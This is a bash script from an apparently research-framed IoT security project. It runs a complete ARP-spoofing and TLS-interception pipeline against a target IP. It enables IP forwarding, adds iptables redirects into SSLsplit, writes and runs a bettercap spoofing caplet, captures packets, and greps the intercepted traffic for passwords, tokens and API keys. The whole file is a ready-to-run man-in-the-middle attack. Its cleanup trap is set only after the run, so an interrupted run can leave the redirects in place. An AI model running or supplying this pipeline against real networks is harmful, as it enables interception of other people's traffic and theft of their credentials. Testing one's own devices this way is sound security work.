#!/usr/bin/env bash
# =============================================================================
# mitm_arp.sh — ARP Spoofing + SSL/TLS Interception Pipeline
# IoT Security Research | Phase 3: MITM Attack
# =============================================================================
# Performs ARP spoofing via bettercap, TLS interception via SSLsplit, and
# packet capture to assess certificate validation and TLS implementation
# quality on the target device.
#
# Device-agnostic pipeline. Current target-device context:
#   Aqara 2K Camera — tests whether hardcoded SDK keys (CVE-2026-50091) or
#     weak certificate validation permit interception/forgery of camera
#     authentication signatures or stream content. Not confirmed to affect
#     device firmware directly (disclosure was SDK/cloud-scoped) — this test
#     determines whether the device-side behavior is actually exploitable.
#   LG TV            — tests general TLS/cert validation on app and update
#     traffic; no specific CVE targeted absent a finalized model/webOS version.
#   KUCACCI Lock      — not applicable; device has no network-layer TLS surface
#     (BLE/keypad only). Use scripts/rf/ble_scan.sh instead.
#
# Usage:
#   sudo bash mitm_arp.sh --target 192.168.100.X --iface eth0 \
#                          --label cam-s1 --out experiments/ip-camera/logs/ \
#                          --duration 600
#
# Requires: bettercap, sslsplit, tcpdump, root privileges
# =============================================================================

set -euo pipefail

TARGET=""
IFACE="eth0"
LABEL="device"
OUT_DIR="./output"
DURATION=0   # 0 = run until Ctrl-C

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target)   TARGET="$2";   shift 2 ;;
    --iface)    IFACE="$2";    shift 2 ;;
    --label)    LABEL="$2";    shift 2 ;;
    --out)      OUT_DIR="$2";  shift 2 ;;
    --duration) DURATION="$2"; shift 2 ;;
    *) echo "[ERROR] Unknown argument: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[ERROR] --target is required"; exit 1; }

mkdir -p "$OUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.log"
PCAP_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.pcap"
BETTERCAP_LOG="$OUT_DIR/bettercap_${LABEL}_${TIMESTAMP}.log"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }

log "===== MITM / TLS Interception: $TARGET ====="
log "Interface: $IFACE | Label: $LABEL | Duration: ${DURATION}s (0=indefinite)"
log ""

# ── Step 1: Enable IP forwarding ──────────────────────────────────────────────
log "── Step 1: Enable IP Forwarding ──"
echo 1 > /proc/sys/net/ipv4/ip_forward
log "IP forwarding enabled"

# ── Step 2: iptables redirect to SSLsplit ─────────────────────────────────────
log ""
log "── Step 2: Configure iptables Redirect ──"
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8443
log "Redirect rules added: 80→8080, 443→8443"

# ── Step 3: Start SSLsplit ────────────────────────────────────────────────────
log ""
log "── Step 3: Start SSLsplit ──"
mkdir -p "$OUT_DIR/sslsplit_logs"
sslsplit -D -l "$OUT_DIR/sslsplit_logs/connections.log" \
  -j "$OUT_DIR/sslsplit_logs/" \
  -S "$OUT_DIR/sslsplit_logs/" \
  http 0.0.0.0 8080 \
  https 0.0.0.0 8443 &
SSLSPLIT_PID=$!
log "SSLsplit started (PID $SSLSPLIT_PID). Logs: $OUT_DIR/sslsplit_logs/"

# ── Step 4: Start packet capture ──────────────────────────────────────────────
log ""
log "── Step 4: Packet Capture ──"
tcpdump -i "$IFACE" -n "host $TARGET" -w "$PCAP_FILE" 2>>"$LOG_FILE" &
TCPDUMP_PID=$!
log "tcpdump capturing to $PCAP_FILE (PID $TCPDUMP_PID)"

# ── Step 5: Start bettercap ARP spoofing ──────────────────────────────────────
log ""
log "── Step 5: ARP Spoofing via bettercap ──"

cat > /tmp/mitm.cap <<CAPEOF
net.probe on
set arp.spoof.targets $TARGET
set arp.spoof.internal true
arp.spoof on
net.sniff on
CAPEOF

bettercap -iface "$IFACE" \
  -caplet /tmp/mitm.cap \
  -log "$BETTERCAP_LOG" &
BETTERCAP_PID=$!
log "bettercap ARP spoofing started (PID $BETTERCAP_PID). Log: $BETTERCAP_LOG"

# ── Run for duration or until Ctrl-C ──────────────────────────────────────────
log ""
if [[ "$DURATION" -gt 0 ]]; then
  log "Running for ${DURATION}s. Monitor $OUT_DIR/sslsplit_logs/ for intercepted data."
  log ""
  log "Success criteria:"
  log "  ✓ VULNERABLE    — plaintext credentials, auth signatures, or decrypted"
  log "                     data found in sslsplit_logs/ (tests cert validation"
  log "                     failure independent of cause — e.g., CVE-2026-50091"
  log "                     class hardcoded-key issues, or simple missing pinning)"
  log "  ✓ CERT PINNING  — SSLsplit connections rejected (connection errors in log)"
  log "  ✓ HTTPS ENFORCE — no plaintext HTTP content captured"
  sleep "$DURATION"
else
  log "Running indefinitely. Press Ctrl-C to stop."
  log "Monitor: tail -f $OUT_DIR/sslsplit_logs/connections.log"
  wait
fi

# ── Cleanup ────────────────────────────────────────────────────────────────────
cleanup() {
  log ""
  log "── Cleanup ──"
  kill "$SSLSPLIT_PID" "$TCPDUMP_PID" "$BETTERCAP_PID" 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null || true
  echo 0 > /proc/sys/net/ipv4/ip_forward
  log "Redirect rules removed, IP forwarding disabled"
}
trap cleanup EXIT

# ── Results summary ────────────────────────────────────────────────────────────
log ""
log "===== MITM Test Complete ====="
log "Evidence files:"
ls -lh "$OUT_DIR/sslsplit_logs/"* 2>/dev/null | head -20 | tee -a "$LOG_FILE"
log ""

# Quick check for captured credentials/auth material
CRED_COUNT=$(grep -ri "password\|passwd\|authorization\|token\|api_key\|signature" \
  "$OUT_DIR/sslsplit_logs/" 2>/dev/null | wc -l || echo 0)
log "Potential credential/auth strings found: $CRED_COUNT"

if [[ "$CRED_COUNT" -gt 0 ]]; then
  log "⚠  RESULT: SSL/TLS interception SUCCEEDED — device does not validate certificates"
  log "   OWASP: I7 (Insecure Data Transfer), I3 (Insecure Ecosystem Interfaces)"
  log "   ETSI:  Provision 5.5 violation"
  log "   If testing Aqara camera: cross-reference with CVE-2026-50091 to determine"
  log "   whether hardcoded SDK keys are the root cause vs. a separate validation gap"
else
  log "✓  No credentials/auth material captured. Check sslsplit connection log for certificate errors."
fi

log "Next: python scripts/analysis/pcap_parser.py --pcap $PCAP_FILE"
log "Next: python scripts/analysis/tls_checker.py --target $TARGET"
